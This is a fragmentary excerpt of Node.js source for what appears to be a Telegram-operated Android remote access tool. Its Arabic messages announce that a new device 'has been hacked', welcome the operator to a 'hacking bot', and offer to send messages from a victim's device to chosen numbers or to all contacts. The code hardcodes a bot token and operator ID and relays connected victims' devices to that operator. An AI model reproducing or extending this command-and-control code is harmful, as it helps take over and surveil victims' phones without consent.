...
const token = '7992976114:AAGTpfH6gpRZv8Z3DT7LT8m33WhVmQlf-Ns'
const id = '6000110447'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : م/محمد الشراعي @Sh_mood7</h1>')
})
...
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(id,
        `°• تم اختراق جهاز جديد بواسطه شراعي @shmood7\n\n` +
        `• جهاز جديد متصل\n\n` +
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات  القادمة المطور حساب المطور @shmood7 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت محمد الشراعي حساب المطور @shmood7\n\n' +
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (commend == 'send_message_to_all') {
        ...
        appBot.sendMessage(id,
            ...
            '• (60)كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
